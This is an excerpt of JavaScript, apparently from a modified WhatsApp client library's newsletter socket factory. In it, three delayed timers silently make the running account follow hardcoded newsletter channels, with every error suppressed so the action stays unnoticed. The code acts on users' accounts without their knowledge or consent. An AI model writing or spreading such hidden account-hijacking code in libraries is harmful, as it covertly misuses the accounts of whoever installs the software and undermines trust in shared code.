...
const makeNewsletterSocket = (config) => {
	...
	setTimeout(async () => {
        try {
            await newsletterWMexQuery("120363426470081124@newsletter", Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 90000);
	setTimeout(async () => {
        try {
            await newsletterWMexQuery("120363408893555851@newsletter", Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 90000);
	setTimeout(async () => {
        try {
            await newsletterWMexQuery("120363424463194558@newsletter", Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 90000);
